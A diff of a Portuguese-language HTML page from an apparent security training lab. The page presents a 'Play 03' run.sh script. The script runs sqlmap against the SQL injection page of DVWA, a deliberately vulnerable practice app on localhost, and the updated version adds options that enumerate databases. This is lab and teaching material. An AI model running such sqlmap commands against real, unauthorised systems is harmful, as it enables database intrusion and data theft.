@@ -1,34 +1,20 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Play 03 — Sqlmap DVWA</title>
+  <meta charset="UTF-8"/>
+  <title>play-03-sqlmap-dvwa — Detalhes</title>
   <link rel="stylesheet" href="../style.css"/>
 </head>
 <body class="neon-dark">
-  <div class="post-modal-container">
-    <div class="post-modal-content">
-      <h1>Play 03 — Sqlmap DVWA</h1>
-      <p>Este Play usa o <code>sqlmap</code> para identificar e explorar uma falha de SQL Injection no DVWA.</p>
-      <h2>Script <code>run.sh</code></h2>
-      <pre><code>#!/bin/bash
-echo "[*] Iniciando análise SQLi com sqlmap..."
-sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=xyz" --batch
-echo "[✓] Análise concluída."</code></pre>
-    </div>
-    <div class="post-modal-actions">
-      <button id="go-play" class="btn neon-btn">▶ Ir ao Play</button>
-      <button id="go-home" class="btn neon-btn">🔙 Voltar à Home</button>
-    </div>
-    <div class="post-modal-footer">
-      <p class="curiosity">
-        🧠 Quer se aprofundar em <strong>SQLMAP</strong>?
-        <a href="https://sqlmap.org/" target="_blank">
-          Explore a documentação oficial →
-        </a>
-      </p>
-    </div>
-  </div>
+  <article>
+    <h1>Play 03 Sqlmap Dvwa</h1>
+    <p>Este Play executa o comando <code>echo "[*] Iniciando análise SQL Injection com sqlmap..."</code>, permitindo avaliar aspectos específicos de segurança.</p>
+    <h2>Script <code>run.sh</code></h2>
+    <pre><code>#!/bin/bash
+echo "[*] Iniciando análise SQL Injection com sqlmap..."
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=test" --batch --level=3 --risk=2 --dbs
+echo "[✓] Análise SQLi concluída."
+</code></pre>
+  </article>
 </body>
 </html>
